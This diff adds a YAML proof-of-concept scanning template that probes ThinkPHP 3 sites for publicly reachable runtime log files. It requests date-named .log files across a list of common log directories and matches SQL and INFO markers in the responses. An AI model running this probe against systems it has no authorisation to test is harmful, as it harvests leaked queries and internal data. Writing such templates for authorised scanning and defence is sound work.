@@ -1,0 +1,66 @@
+id: poc-local-thinkphp-v3-logfile-leak
+
+info:
+  name: thinkphp3日志文件泄露
+  author: capiton
+  severity: medium
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  year: '{{substr(date_time("%Y"),2,4)}}'
+  month: '{{date_time("%M")}}'
+  today: '{{date_time("%D")}}'
+  yesterday: '{{to_number(today) - 1 }}'
+
+requests:
+  - raw:
+      - |+
+        GET /{{dir}}{{year}}_{{month}}_{{today}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}_{{month}}_{{yesterday}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}_{{month}}_0{{today}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}_{{month}}_0{{yesterday}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+
+    payloads:
+      dir:
+        - Runtime/Logs/
+        - App/Runtime/Logs/
+        - Application/Runtime/Logs/
+        - Application/Runtime/Logs/Admin/
+        - Application/Runtime/Logs/Home/
+        - Application/Runtime/Logs/App/  
+        - Application/Runtime/Logs/Ext/  
+        - Application/Runtime/Logs/Api/  
+        - Application/Runtime/Logs/Test/  
+        - Application/Runtime/Logs/Common/  
+        - Application/Runtime/Logs/Service/  
+    attack: clusterbomb
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - "INFO:"
+          - "SQL:"
+          - "NOTIC:"
+          - "[ info ]"
+          - "[ sql ]"
+
